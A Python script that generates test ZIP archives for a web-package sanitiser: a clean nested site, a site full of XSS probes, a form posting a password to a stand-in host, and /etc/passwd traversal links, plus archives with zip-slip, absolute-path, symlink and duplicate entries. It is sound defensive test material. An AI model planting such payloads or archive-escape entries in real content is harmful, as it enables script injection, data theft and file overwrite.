#!/usr/bin/env python3
"""生成演示样例 ZIP（输出到本文件所在目录）：

  nested_site.zip      嵌套目录 + 相对/根相对引用 + 多页互链 —— 正常通过
  malicious_refs.zip   脚本/事件属性/表单/iframe/base/外链/越界/缺失/@import
                       —— 通过 ZIP 校验，但全部恶意内容被拦截并列入清单
  reject_traversal.zip 含 ../ 逃逸条目          —— 整体拒绝
  reject_absolute.zip  含绝对路径条目           —— 整体拒绝
  reject_symlink.zip   含符号链接条目           —— 整体拒绝
  reject_dup.zip       规范化后重名的条目       —— 整体拒绝
"""
import base64
import os
import stat
import struct
import zipfile
import zlib

OUT_DIR = os.path.dirname(os.path.abspath(__file__))

# 48x24 红色 JPEG（基线编码，魔数 FF D8 FF）
JPG_BANNER = base64.b64decode(
    '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8S'
    'EhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEU'
    'Hh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/'
    'wAARCAAYADADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QA'
    'tRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2Jy'
    'ggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqD'
    'hIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi'
    '4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QA'
    'tREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLR'
    'ChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6'
    'goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna'
    '4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDFooor5U/dQooooAKKKKACiiigAooo'
    'oAKKKKAP/9k='
)


def make_png(w, h, rgb):
    """生成纯色 PNG 字节。"""
    def chunk(typ, data):
        return (struct.pack('>I', len(data)) + typ + data
                + struct.pack('>I', zlib.crc32(typ + data) & 0xffffffff))
    ihdr = struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)
    raw = b''.join(b'\x00' + bytes(rgb) * w for _ in range(h))
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr)
            + chunk(b'IDAT', zlib.compress(raw)) + chunk(b'IEND', b''))


LOGO_PNG = make_png(16, 16, (59, 111, 212))
BG_PNG = make_png(4, 4, (228, 236, 248))
OK_PNG = make_png(24, 24, (6, 118, 71))


def write_zip(name, entries):
    """entries: [(文件名, bytes|str, external_attr)]，external_attr 可省略。"""
    path = os.path.join(OUT_DIR, name)
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for item in entries:
            fname, data = item[0], item[1]
            attr = item[2] if len(item) > 2 else 0
            if isinstance(data, str):
                data = data.encode('utf-8')
            info = zipfile.ZipInfo(fname)
            info.external_attr = attr
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)
    print('生成', path)


# ---------------------------------------------------------------- 正常样张

NESTED_INDEX = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>嵌套路径样例 · 首页</title>
<link rel="stylesheet" href="/assets/css/site.css">
<style>
  .hero {
    padding: 12px; border: 3px solid #3b6fd4;
    background-image: url(assets/img/logo.png);
    background-repeat: no-repeat; background-position: right center;
  }
</style>
</head>
<body>
<h1>嵌套路径样例</h1>
<p><img src="assets/img/logo.png" alt="logo" width="16" height="16">
   相对路径图片；样式表为根相对地址（指向包根）。</p>
<p class="hero">内联 &lt;style&gt; 中的 url() 按本文件目录解析。</p>
<ul>
  <li><a href="pages/about.html">关于（相对链接）</a></li>
  <li><a href="/pages/gallery.html">画廊（根相对链接）</a></li>
</ul>
</body>
</html>
"""

NESTED_ABOUT = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>关于</title>
<link rel="stylesheet" href="../assets/css/pages.css">
</head>
<body>
<h1>关于</h1>
<p><img src="../assets/img/banner.jpg" alt="banner"></p>
<p><a href="../index.html">返回首页</a> · <a href="gallery.html">画廊</a></p>
</body>
</html>
"""

NESTED_GALLERY = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>画廊</title>
<link rel="stylesheet" href="/assets/css/pages.css">
</head>
<body>
<h1>画廊</h1>
<p><img src="/assets/img/bg.png" alt="bg">
   <img src="./../assets/img/logo.png" alt="logo"></p>
<p><a href="./about.html">关于</a> · <a href="/index.html">首页</a></p>
</body>
</html>
"""

SITE_CSS = """@charset "utf-8";
body {
  font-family: system-ui, sans-serif; margin: 24px;
  background: #f5f7fc url(../img/bg.png) repeat-x top;
}
h1 { color: #233; }
.hero::after {
  content: ""; display: inline-block; width: 16px; height: 16px;
  background-image: url("/assets/img/logo.png"); background-size: cover;
}
"""

PAGES_CSS = """h1 { border-bottom: 2px solid #3b6fd4; }
img { border: 1px solid #ccd; }
"""

# ---------------------------------------------------------------- 恶意引用样张

EVIL_INDEX = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="0; url=https://evil.example/">
<base href="https://evil.example/">
<title>恶意引用样例</title>
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://evil.example/steal.css">
<script>alert('xss')</script>
</head>
<body onclick="alert('xss')">
<h1>恶意引用样例（应被全部拦截）</h1>
<p><img src="ok.png" alt="正常图片"> 正常图片</p>
<p><img src="missing.png" alt="缺失"> 缺失图片</p>
<p><img src="../secret.png" alt="越界"> 越界图片</p>
<p><img src="https://evil.example/track.png" alt="外链"> 外链图片</p>
<p><img src="//evil.example/proto-relative.png" alt="协议相对"> 协议相对图片</p>
<p><a href="page2.html">正常内链</a></p>
<p><a href="https://evil.example/">外链</a></p>
<p><a href="javascript:alert('xss')">javascript: 链接</a></p>
<p><a href="/../../etc/passwd">越界链接</a></p>
<p><a href="ghost.html">缺失链接</a></p>
<iframe src="https://evil.example/"></iframe>
<form action="https://evil.example/collect" method="post">
  <input name="pw" value="123456"><button>提交</button>
</form>
<object data="https://evil.example/x.swf"></object>
<div style="background-image: url(https://evil.example/bg.png)">内联样式外链背景</div>
<div style="background-image: url(../escape.png)">内联样式越界背景</div>
</body>
</html>
"""

EVIL_PAGE2 = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>第二页</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<h1>第二页</h1>
<p><a href="index.html">回首页</a></p>
<p><a href="https://evil.example/more">外链</a></p>
<p><img src="ok.png" alt="ok"></p>
</body>
</html>
"""

EVIL_CSS = """@charset "utf-8";
@import url("https://evil.example/remote.css");
@import "missing.css";
body { background: #fff url(ok.png); font-family: sans-serif; }
.banner { background-image: url(https://evil.example/bg.png); }
.escape { background-image: url(../outside.png); }
.miss { background-image: url(none.png); }
.x { width: expression(alert(1)); behavior: url(x.htc); }
"""


def main():
    # 1. 正常嵌套样张
    write_zip('nested_site.zip', [
        ('index.html', NESTED_INDEX),
        ('pages/about.html', NESTED_ABOUT),
        ('pages/gallery.html', NESTED_GALLERY),
        ('assets/css/site.css', SITE_CSS),
        ('assets/css/pages.css', PAGES_CSS),
        ('assets/img/logo.png', LOGO_PNG),
        ('assets/img/bg.png', BG_PNG),
        ('assets/img/banner.jpg', JPG_BANNER),
    ])

    # 2. 恶意引用样张（ZIP 结构合法，内容恶意）
    write_zip('malicious_refs.zip', [
        ('index.html', EVIL_INDEX),
        ('page2.html', EVIL_PAGE2),
        ('style.css', EVIL_CSS),
        ('ok.png', OK_PNG),
    ])

    # 3. 各类应被拒绝的 ZIP
    write_zip('reject_traversal.zip', [
        ('index.html', '<html><body>ok</body></html>'),
        ('../escape.html', '<html><body>escape</body></html>'),
    ])
    write_zip('reject_absolute.zip', [
        ('index.html', '<html><body>ok</body></html>'),
        ('/abs/evil.html', '<html><body>abs</body></html>'),
    ])
    symlink_mode = (stat.S_IFLNK | 0o777) << 16
    write_zip('reject_symlink.zip', [
        ('index.html', '<html><body>ok</body></html>'),
        ('linked.html', 'index.html', symlink_mode),
    ])
    write_zip('reject_dup.zip', [
        ('index.html', '<html><body>ok</body></html>'),
        ('a/./dup.html', '<html><body>1</body></html>'),
        ('a/dup.html', '<html><body>2</body></html>'),
    ])


if __name__ == '__main__':
    main()
